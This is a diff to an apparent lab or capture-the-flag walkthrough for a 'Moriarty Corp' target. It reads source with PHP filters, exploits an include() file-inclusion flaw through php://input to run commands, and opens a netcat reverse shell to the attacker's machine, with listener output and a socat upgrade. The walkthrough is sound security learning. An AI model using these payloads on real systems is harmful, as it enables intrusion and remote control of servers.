@@ -83,3 +83,79 @@ After entering the flag on port 8000 , we now get more information
 \
 <img width="1202" height="534" alt="image" src="https://github.com/user-attachments/assets/5962dd58-a212-4776-98dd-c91de2ca5854" />
 \
+After wasting a lot of time , i realized what if i used php filters to get the source code of the app
+\
+<img width="1681" height="661" alt="image" src="https://github.com/user-attachments/assets/08f0456c-0f6d-4392-92ab-000bb9f02efb" />
+\
+Actually i was fuzzing for readable files and found the app directory as "/app"  from the file "/etc/apache2/httpd.conf"
+```bash
+<Directory "/app/">
+	AllowOverride All
+</Directory>
+```
+\
+Even if we dont use "/app" in the request , it will relatively get the same result , since the app is running in same directory
+\
+After realizing that the source code had "include" function of php , we know that it can execute php commands
+```bash
+$incfile = $_REQUEST["file"];
+include($incfile);
+```
+\
+So i test a POST curl command
+```bash
+curl -X POST "http://192.168.0.116/?file=php://input" -d "<?php system('id'); ?>"
+<html>
+<head>
+<title>Welcome to Moriarty Corp. Blog</title>
+</head>
+<body>
+<p>
+Welcome to Moriarty Corp. Blog. All our business is legit.
+<br/>
+Check out our blog posts:<br/>
+<a href="/?file=page1.html">Blog Post 1</a><br/>
+<a href="/?file=page2.html">Blog Post 2</a><br/>
+</p>
+<p>
+uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)
+</p>
+</body>
+</html>
+```
+\
+Then to convert into a reverse shell i used the command
+```bash
+curl -X POST "http://192.168.0.116/?file=php://input" -d "<?php system('busybox nc 192.168.0.124 4444 -e /bin/sh'); ?>"
+```
+```bash
+penelope
+[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.0.124
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] Got reverse shell from 6b0391ef95b7~192.168.0.116-Linux-x86_64 😍 Assigned SessionID <1>
+[+] Attempting to upgrade shell to PTY...
+[!] Cannot upgrade shell with the available binaries...
+
+  1) Upload https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat
+  2) Upload local socat binary
+  3) Specify remote socat binary path
+  4) None of the above
+
+[?] Select action: 1
+[•] Download URL: https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat
+ ⤷ [########################################] 100% (366.4 KBytes/366.4 KBytes) | Elapsed 0:00:00
+[+] Upload OK /var/tmp/socat
+
+[!] Python agent cannot be deployed. I need to maintain at least one Raw session to handle the PTY
+[+] Attempting to spawn a reverse shell on 192.168.0.124:4444
+[+] Got reverse shell from 6b0391ef95b7~192.168.0.116-Linux-x86_64 😍 Assigned SessionID <2>
+[+] Shell upgraded successfully using /var/tmp/socat! 💪
+[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
+[+] Logging to /home/kali/.penelope/sessions/6b0391ef95b7~192.168.0.116-Linux-x86_64/2026_04_21-09_46_28-492.log 📜
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+/bin/sh: id
+uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)
+/app $ 
+
+```
+\
